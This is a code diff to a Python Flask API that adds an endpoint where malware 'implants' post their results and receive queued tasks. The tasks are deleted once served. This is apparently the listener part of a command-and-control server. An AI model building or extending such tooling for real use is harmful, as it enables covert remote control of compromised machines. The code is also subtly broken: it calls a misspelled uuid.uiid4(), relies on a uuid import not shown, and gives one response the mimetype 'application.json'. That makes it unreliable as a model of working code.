@@ -4,7 +4,7 @@ import json
 from flask import request, Response
 from flask_restful import Resource
 from database.db import initialize_db
-from database.models import Task
+from database.models import Task, Result
 
 class Tasks(Resource):
     # ListTasks
@@ -43,3 +43,33 @@ class Tasks(Resource):
                         mimetype="application/json",
                         status=200)
 
+class Results(Resource):
+    # ListResults
+    def get(self):
+        # Get all result objects and return them to the user
+        results = Result.objects().to_json()
+        return Response(results, mimetype="application.json", status=200)
+    
+    # AddResults
+    def post(self):
+        # Check if the results from the implant are populated
+        if str(request.get_json()) != '{}':
+            # Parse out the result JSON that we want to add to the DB
+            body = request.get_json()
+            print("Received implant response: {}".format(body))
+            json_obj = json.loads(json.dumps(body))
+            # Add a result UUID to each result object for tracking
+            json_obj['result_id'] = str(uuid.uiid4())
+            Result(**json_obj).save()
+            # Serve latest tasks to implant
+            tasks = Task.objects().to_json()
+            # Clear tasks so they don't execute twice
+            Task.objects().delete()
+            return Response(tasks, mimetype="application/json", status=200)
+        else:
+            # Serve latest tasks to implant
+            tasks = Task.objects().to_json()
+            # Clear tasks so they don't execute twice
+            Task.objects().delete()
+            return Response(tasks, mimetype="application/json", status=200)
+        
